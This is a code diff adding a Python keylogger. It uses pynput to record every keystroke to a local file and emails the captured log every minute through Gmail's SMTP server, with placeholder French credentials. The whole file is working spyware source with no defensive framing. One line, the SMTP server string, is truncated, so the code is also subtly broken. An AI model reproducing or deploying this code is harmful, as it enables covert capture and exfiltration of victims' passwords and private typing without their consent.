@@ -1,0 +1,57 @@
+import smtplib
+import time
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from pynput.keyboard import Listener, Key
+
+LOG_FILE = "log.txt"
+TO_EMAIL = "votre_email@gmail.com"
+FROM_EMAIL = "votre_email@gmail.com"
+SMTP_SERVER = "smtp.gmail.c
+SMTP_PORT = 587
+SMTP_USERNAME = "votre_email@gmail.com"
+SMTP_PASSWORD = "votre_mot_de_passe"
+
+def write_to_file(key):
+    letter = str(key)
+    letter = letter.replace("'", "")
+
+    if key == Key.space:
+        letter = ' '
+    elif key == Key.shift_r or key == Key.ctrl_l:
+        letter = ''
+    elif key == Key.backspace or key == Key.enter:
+        letter = "\n" if key == Key.enter else ""
+
+    with open(LOG_FILE, 'a') as f:
+        f.write(letter)
+
+def send_email():
+    msg = MIMEMultipart()
+    msg['From'] = FROM_EMAIL
+    msg['To'] = TO_EMAIL
+    msg['Subject'] = 'Keylogger Log'
+
+    with open(LOG_FILE, 'r') as f:
+        log_content = f.read()
+
+    body = MIMEText(log_content)
+    msg.attach(body)
+
+    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+        server.starttls()
+        server.login(SMTP_USERNAME, SMTP_PASSWORD)
+        server.sendmail(FROM_EMAIL, TO_EMAIL, msg.as_string())
+
+# Collecting events until stopped
+try:
+    with Listener(on_press=write_to_file) as l:
+        while True:
+            time.sleep(60)
+            send_email()
+except KeyboardInterrupt:
+    print("Keylogger stopped by user.")
+except Exception as e:
+    print(f"Error: {e}")
+finally:
+    print("Stopped listening.")
